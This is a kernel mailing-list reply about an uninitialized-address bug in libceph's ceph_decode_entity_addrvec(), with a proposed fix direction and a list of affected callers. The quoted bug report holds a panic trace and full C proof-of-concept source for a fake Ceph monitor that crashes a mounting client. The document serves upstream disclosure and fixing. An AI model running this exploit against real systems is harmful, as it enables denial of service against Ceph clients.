Received: from proxmox-new.maurer-it.com (proxmox-new.maurer-it.com [94.136.29.106])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B88D63B42C4;
	Mon, 22 Jun 2026 14:16:33 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=94.136.29.106
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782137796; cv=none; b=XohQoxmk5YLclNiwsOtEaOw1DqdqNFz/9H0oMsBxVcIUstuP1lesewnZnFcqa60Q3erZkcKIVjP8NkmGrgFdhKWK9oVUcaoIe4UslAll1KK5ee0r+AlFl3X2HB4Fk8/EJlhiNdEJhGOm53uCn+6pE/Ze1X1q2tSeAKAFIbn4oyg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782137796; c=relaxed/simple;
	bh=1C5Qitd0g5twe5hGOTIfTWu9xIrNKFQVvVM8eCsGeRs=;
	h=From:To:Cc:Subject:In-Reply-To:References:Date:Message-ID:
	 MIME-Version:Content-Type; b=O3cR/TuJ1WIO0LJTEzruEGu4+7tIgPkub/mFBReFN78PdJbyMIYiCPmsOsKqf1B2A81xBuG8q5sJPdd81ZwYLCneCzrdQMkx4p2hgNejokG73TXp+Sr5YJGyreyZLfsrYCq0r4GTbhMWPkzLUtw4l6aNRFvPzu7fQbR2fjteZ2A=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=proxmox.com; spf=pass smtp.mailfrom=proxmox.com; arc=none smtp.client-ip=94.136.29.106
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=proxmox.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=proxmox.com
Received: from proxmox-new.maurer-it.com (localhost.localdomain [127.0.0.1])
	by proxmox-new.maurer-it.com (Proxmox) with ESMTP id AD22C46501;
	Mon, 22 Jun 2026 16:09:23 +0200 (CEST)
From: Kefu Chai <k.chai@proxmox.com>
To: XIAO WU <xiaowu.417@qq.com>, ceph-devel@vger.kernel.org
Cc: Ilya Dryomov <idryomov@gmail.com>, Alex Markuze <amarkuze@redhat.com>,
 Viacheslav Dubeyko <slava@dubeyko.com>, linux-kernel@vger.kernel.org
Subject: Re: [PATCH v3] libceph: tolerate addrvecs with multiple entries of
 the same type
In-Reply-To: <tencent_3A900D10F5E1841A0950F6CAA67897936D09@qq.com>
References: <20260604140231.2759025-1-k.chai@proxmox.com>
 <20260611113251.2975975-1-k.chai@proxmox.com>
 <tencent_3A900D10F5E1841A0950F6CAA67897936D09@qq.com>
Date: Mon, 22 Jun 2026 22:09:17 +0800
Message-ID: <87echy650y.fsf@proxmox.com>
Precedence: bulk
X-Mailing-List: ceph-devel@vger.kernel.org
List-Id: <ceph-devel.vger.kernel.org>
List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable
X-Bm-Milter-Handled: 55990f41-d878-4baa-be0a-ee34c49e34d2
X-Bm-Transport-Timestamp: 1782137352426

XIAO WU <xiaowu.417@qq.com> writes:

> Hi Kefu,
>
> I came across a Sashiko AI code review [1] that flagged a pre-existing
> uninitialized memory issue in `ceph_decode_entity_addrvec()`.=C2=A0 When =
the
> addrvec has zero entries (`addr_cnt =3D=3D 0`), the function returns 0
> without writing to `*addr`, but callers like `ceph_monmap_decode()`
> pass addresses from `kmalloc_flex()` and proceed to use them.
>

hi Xiao,

Thanks for the report and the reproducer. I can confirm it. But I'd
prefer sending the fix separately rather than fold it into v3, as you
pointed out it's pre-existing and independent of my patch.

I took a look at the callers of `ceph_decode_entity_addrvec()`.
Following caller suffers from this issue:

- ceph_monmap_decode()         mon_inst[] from kmalloc_flex() (heap)
- ceph_mdsmap_decode()         on-stack addr -> m_info[mds].addr
- decode_new_up_state_weight() on-stack addr -> osd_addr[osd]
- ProtocolV2 server_ident      on-stack addr, used in memcmp()

osdmap_decode() is the one caller where an empty addrvec is *legitimate*,
and the slot is pre-zeroed with osdmap_set_max_osd(), so it's safe.

> I was able to reproduce this in QEMU by running a fake Ceph monitor that
> sends a monmap with an empty addrvec.=C2=A0 With `panic_on_warn=3D1`, the
> kernel hits a WARNING in `ceph_con_v1_try_read()` and panics.
>

For the commit message / changelog, I'd state the threat model: this
needs a malformed or buggy peer, since legitimate daemons always
advertise at least one addresss -- I checked the current ceph.git to
verify this. But I agree that the connect-to-bogus-addr and panic you
hit does have a concrete impact, as kernel should not panic on malformed
input. this could happen over an unencrypted, signature-unchecked msgr
v1 transport.

For the fix, i'd avoid a defenseive memset() of *addr. as this reminds
me a strncpy which always reset the dest str even if the source str's
length is zero. So I think the right fix is probably to extend the
semantic of `-ENOENT` returned by ceph_decode_entity_addrvec().
Currently, this func returns `-ENOENT` to indicate that "the addrvec has
entries, but none of them is of the wanted type". We can extend to
apply to the emtpy addrvec, so it imply that "no addr of the requested
type". This way, we only need to update osdmap_decode() so it tolerates
-ENOENT.

Ilya, does this direction look right?

>
> On Thu, Jun 11, 2026 at 07:32:51PM +0800, Kefu Chai wrote:
>  > ceph_decode_entity_addrvec() currently rejects any addrvec containing
>  > more than one entry that matches the requested msgr type...
>
> Your patch correctly tolerates duplicate entries, but the function still
> returns success without touching `*addr` when `addr_cnt =3D=3D 0`:
>
> ```c
> // net/ceph/decode.c: ceph_decode_entity_addrvec()
> if (!addr_cnt)
>  =C2=A0 =C2=A0 return 0;=C2=A0 // *addr is still uninitialized
> if (addr_cnt =3D=3D 1 && !memchr_inv(&tmp_addr, 0, sizeof(tmp_addr)))
>  =C2=A0 =C2=A0 return 0;=C2=A0 // same
> ```
>
> Callers that pass addresses from dynamic allocation hit stale data:
>
> ```c
> // net/ceph/mon_client.c: ceph_monmap_decode()
> mon_inst =3D kmalloc_flex(..., num_mon, sizeof(*mon_inst));
> // ...
> ceph_decode_entity_addrvec(p, end, msgr2, &mon_inst[i].addr);
> // mon_inst[i].addr may be uninitialized if addrvec was empty
> ```
>
> [Reproduction]
>
> I set up a fake Ceph v1 monitor on localhost that sends a monmap
> containing a monitor entry with an empty addrvec (addr_cnt=3D0). Mounting
> the Ceph filesystem against it triggers the monmap decode path, causing
> the client to attempt a connection with the uninitialized address.
>
> [Crash =E2=80=94 kernel 7.1.0-rc6, panic_on_warn=3D1]
>
>  =C2=A0 con->v1.connect_seq !=3D le32_to_cpu(con->v1.in_reply.connect_seq)
>  =C2=A0 WARNING: net/ceph/messenger_v1.c:901 at=20
> ceph_con_v1_try_read+0x59f7/0x7020
>
>  =C2=A0 RIP: 0010:ceph_con_v1_try_read+0x59f7/0x7020
>  =C2=A0 Call Trace:
>  =C2=A0 =C2=A0<TASK>
>  =C2=A0 =C2=A0ceph_con_workfn+0xa04/0x13c0
>  =C2=A0 =C2=A0process_one_work+0xa20/0x1c50
>  =C2=A0 =C2=A0worker_thread+0x6df/0xf30
>  =C2=A0 =C2=A0kthread+0x387/0x4a0
>  =C2=A0 =C2=A0ret_from_fork+0xb2c/0xdd0
>  =C2=A0 =C2=A0</TASK>
>
>  =C2=A0 Kernel panic - not syncing: kernel: panic_on_warn set ...
>
> Full PoC source (poc.c):
> ---8<----------------------------------------------------------------
> /*
>  =C2=A0* PoC: Uninitialized memory in ceph_decode_entity_addrvec()
>  =C2=A0* Compile: gcc -static -o poc poc.c
>  =C2=A0* Run: ./poc [port]
>  =C2=A0*/
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/socket.h>
> #include <sys/mount.h>
> #include <sys/wait.h>
> #include <sys/stat.h>
> #include <sys/poll.h>
> #include <arpa/inet.h>
> #include <netinet/in.h>
> #include <stdint.h>
> #include <errno.h>
> #include <fcntl.h>
>
> #define BANNER "ceph v027"
> #define BNR 9
> #define ADR 136
> #define CBNR (BNR+ADR)
> #define SBNR (BNR+2*ADR)
>
> #define TAG_RDY 1
> #define TAG_MSG 7
> #define MON_MAP 4
> #define ENT_MON 1
>
> #define MSZ 16384
>
> typedef uint8_t u8; typedef uint16_t u16;
> typedef uint32_t u32; typedef uint64_t u64;
>
> static u32 ct[256];
> static int ci;
>
> static void ic(void)
> {
>  =C2=A0 =C2=A0 u32 i, j, k;
>  =C2=A0 =C2=A0 if (ci) return;
>  =C2=A0 =C2=A0 for (i =3D 0; i < 256; i++) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 k =3D i;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 for (j =3D 0; j < 8; j++)
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 =C2=A0 k =3D (k >> 1) ^ (k & 1 ? 0x82=
F63B78 : 0);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 ct[i] =3D k;
>  =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 ci =3D 1;
> }
>
> static u32 crc(u32 c, const u8 *b, int l)
> {
>  =C2=A0 =C2=A0 while (l--) c =3D ct[(c ^ *b++) & 0xFF] ^ (c >> 8);
>  =C2=A0 =C2=A0 return c;
> }
>
> #define W8(b,v)=C2=A0 ((b)[0] =3D (u8)(v))
> #define W16(b,v) ((b)[0]=3D(v)&255,(b)[1]=3D((v)>>8)&255)
> #define W32(b,v)=20
> ((b)[0]=3D(v)&255,(b)[1]=3D((v)>>8)&255,(b)[2]=3D((v)>>16)&255,(b)[3]=3D(=
(v)>>24)&255)
> #define W64(b,v) do { int _i; for (_i=3D0; _i<8; _i++)=20
> (b)[_i]=3D((u64)(v)>>(_i*8))&255; } while(0)
>
> #define REQ_FEAT (1ULL << 23)
>
> static int rcv(int f, u8 *b, int l)
> {
>  =C2=A0 =C2=A0 while (l > 0) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct pollfd p =3D { .fd =3D f, .events =3D=
 POLLIN };
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (poll(&p, 1, 15000) <=3D 0) return -1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 int n =3D read(f, b, l);
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (n <=3D 0) return -1;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 b +=3D n; l -=3D n;
>  =C2=A0 =C2=A0 }
>  =C2=A0 =C2=A0 return 0;
> }
>
> static int snd(int f, u8 *b, int l)
> {
>  =C2=A0 =C2=A0 while (l > 0) { int n =3D write(f, b, l); if (n <=3D 0) re=
turn -1; b +=3D=20
> n; l -=3D n; }
>  =C2=A0 =C2=A0 return 0;
> }
>
> static int ea(u8 *b) { W8(b, 2); W32(b+1, 0); return 5; }
>
> static int pay(u8 *b)
> {
>  =C2=A0 =C2=A0 int o =3D 0, bo, so, po, mo, ms;
>  =C2=A0 =C2=A0 bo =3D o; W32(b+o, 0); o +=3D 4;
>  =C2=A0 =C2=A0 W8(b+o, 6); o++; W8(b+o, 1); o++;
>  =C2=A0 =C2=A0 so =3D o; W32(b+o, 0); o +=3D 4;
>  =C2=A0 =C2=A0 po =3D o;
>  =C2=A0 =C2=A0 W64(b+o, 0x42); o +=3D 8;
>  =C2=A0 =C2=A0 W32(b+o, 1); o +=3D 4;
>  =C2=A0 =C2=A0 W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o +=3D 4;
>  =C2=A0 =C2=A0 W8(b+o, 1); o++; W8(b+o, 1); o++; W32(b+o, 0); o +=3D 4;
>  =C2=A0 =C2=A0 W32(b+o, 1); o +=3D 4;
>  =C2=A0 =C2=A0 W32(b+o, 2); o +=3D 4; memcpy(b+o, "m0", 2); o +=3D 2;
>  =C2=A0 =C2=A0 W8(b+o, 1); o++; W8(b+o, 1); o++;
>  =C2=A0 =C2=A0 mo =3D o; W32(b+o, 0); o +=3D 4;
>  =C2=A0 =C2=A0 ms =3D o;
>  =C2=A0 =C2=A0 W32(b+o, 2); o +=3D 4; memcpy(b+o, "m0", 2); o +=3D 2;
>  =C2=A0 =C2=A0 o +=3D ea(b+o);
>  =C2=A0 =C2=A0 W32(b+mo, o - ms);
>  =C2=A0 =C2=A0 W32(b+so, o - po);
>  =C2=A0 =C2=A0 W32(b+bo, o - bo);
>  =C2=A0 =C2=A0 return o;
> }
>
> #define HS 60
> #define FS 13
>
> static int msg(u8 *b, u64 s)
> {
>  =C2=A0 =C2=A0 int o =3D 0;
>  =C2=A0 =C2=A0 b[o++] =3D TAG_MSG;
>  =C2=A0 =C2=A0 int h =3D o;
>  =C2=A0 =C2=A0 memset(b+o, 0, HS); o +=3D HS;
>  =C2=A0 =C2=A0 int pl =3D pay(b+o); o +=3D pl;
>  =C2=A0 =C2=A0 memset(b+o, 0, FS); o +=3D FS;
>  =C2=A0 =C2=A0 u8 *hh =3D b + h;
>  =C2=A0 =C2=A0 W64(hh+0, s); W16(hh+16, MON_MAP); W16(hh+18, 127);
>  =C2=A0 =C2=A0 W16(hh+20, 1); W32(hh+22, pl); W64(hh+36, ENT_MON);
>  =C2=A0 =C2=A0 W64(hh+44, 0); W32(hh+56, crc(0, hh, 56));
>  =C2=A0 =C2=A0 return o;
> }
>
> static int mon(int pt)
> {
>  =C2=A0 =C2=A0 int s, c; struct sockaddr_in a; u8 b[MSZ];
>  =C2=A0 =C2=A0 ic();
>  =C2=A0 =C2=A0 s =3D socket(AF_INET, SOCK_STREAM, 0);
>  =C2=A0 =C2=A0 int o =3D 1; setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &o, s=
izeof(o));
>  =C2=A0 =C2=A0 memset(&a, 0, sizeof(a)); a.sin_family =3D AF_INET;
>  =C2=A0 =C2=A0 a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK); a.sin_port =
=3D htons(pt);
>  =C2=A0 =C2=A0 bind(s, (void *)&a, sizeof(a)); listen(s, 1);
>  =C2=A0 =C2=A0 struct pollfd p =3D { .fd =3D s, .events =3D POLLIN };
>  =C2=A0 =C2=A0 if (poll(&p, 1, 60000) <=3D 0) goto out;
>  =C2=A0 =C2=A0 c =3D accept(s, 0, 0);
>
>  =C2=A0 =C2=A0 if (rcv(c, b, CBNR) < 0) goto done;
>  =C2=A0 =C2=A0 { u8 *p =3D b; memcpy(p, BANNER, BNR); p +=3D BNR;
>  =C2=A0 =C2=A0 =C2=A0 memset(p, 0, ADR); p +=3D ADR; memset(p, 0, ADR);
>  =C2=A0 =C2=A0 =C2=A0 if (snd(c, b, SBNR) < 0) goto done; }
>  =C2=A0 =C2=A0 { int t =3D 0; while (t < 26) {
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 struct pollfd p2 =3D { .fd =3D c, .events =
=3D POLLIN };
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 if (poll(&p2, 1, 10000) <=3D 0) goto done;
>  =C2=A0 =C2=A0 =C2=A0 =C2=A0 int n =3D read(c, b+t, MSZ-t); if (n <=3D 0)=
 goto done; t +=3D n; } }
>  =C2=A0 =C2=A0 memset(b, 0, 26); W8(b, TAG_RDY); W64(b+1, REQ_FEAT);
>  =C2=A0 =C2=A0 snd(c, b, 26); usleep(300000);
>  =C2=A0 =C2=A0 { int ml =3D msg(b, 1); snd(c, b, ml); }
>  =C2=A0 =C2=A0 usleep(500000);
>  =C2=A0 =C2=A0 { int ml =3D msg(b, 2); snd(c, b, ml); }
> out:
>  =C2=A0 =C2=A0 close(c); close(s); return 0;
> done:
>  =C2=A0 =C2=A0 close(c); close(s); return -1;
> }
>
> int main(int ac, char **av)
> {
>  =C2=A0 =C2=A0 int pt =3D 16789; if (ac >=3D 2) pt =3D atoi(av[1]);
>  =C2=A0 =C2=A0 pid_t pid =3D fork();
>  =C2=A0 =C2=A0 if (pid =3D=3D 0) { mon(pt); _exit(0); }
>  =C2=A0 =C2=A0 usleep(200000);
>  =C2=A0 =C2=A0 mkdir("/tmp/mnt", 0700);
>  =C2=A0 =C2=A0 char s[64]; snprintf(s, 64, "127.0.0.1:%d:/", pt);
>  =C2=A0 =C2=A0 mount(s, "/tmp/mnt", "ceph", 0, "name=3Dadmin");
>  =C2=A0 =C2=A0 waitpid(pid, 0, 0);
>  =C2=A0 =C2=A0 umount2("/tmp/mnt", MNT_FORCE); rmdir("/tmp/mnt");
>  =C2=A0 =C2=A0 return 0;
> }
> ---8<----------------------------------------------------------------
> Compile: gcc -static -o poc poc.c
>
> [1]=20
> https://sashiko.dev/#/patchset/20260611113251.2975975-1-k.chai%40proxmox.=
com
>  =C2=A0 =C2=A0 (Sashiko AI code review =E2=80=94 "Uninitialized Memory", =
Severity: High)
>
> Thanks,
> XIAOWU

